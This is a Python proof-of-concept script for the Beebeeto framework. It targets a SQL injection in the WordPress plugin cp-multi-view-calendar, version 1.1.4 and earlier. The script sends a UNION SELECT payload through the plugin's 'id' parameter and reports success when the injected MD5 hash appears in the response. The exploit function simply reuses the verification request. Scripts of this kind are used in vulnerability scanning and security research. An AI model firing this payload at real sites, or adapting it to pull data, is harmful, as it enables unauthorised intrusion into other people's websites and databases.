#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0095',
            'name': 'WordPress cp-multi-view-calendar <= 1.1.4 SQL Injection POC',
            'author': 'pangzi',
            'create_date': '2015-05-01',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'WordPress',
            'vul_version': ['<=1.1.4'],
            'type': 'SQL Injection',
            'tag': ['WordPress插件漏洞', 'cp-multi-view-calendar', 'SQL Injection'],
            'desc': '''
                    cp-multi-view-calendar is a plugin allow you insert event calender into
                    your wp website.版本在1.1.4及其以下存在sql注入
                    ''',
            'references': [
                    'http://packetstormsecurity.com/files/128814/WordPress-CP-Multi-View-Event-Calendar-1.01-SQL-Injection.html',
                    ],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        payload = ('/?action=data_management&cpmvc_do_action=mvparse&f=edit&id=1 union all select MD5(233)'
                    ',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#')
        verify_url = url + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = requests.get(verify_url).content
        if 'e165421110ba03099a1c0393373c5b43' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())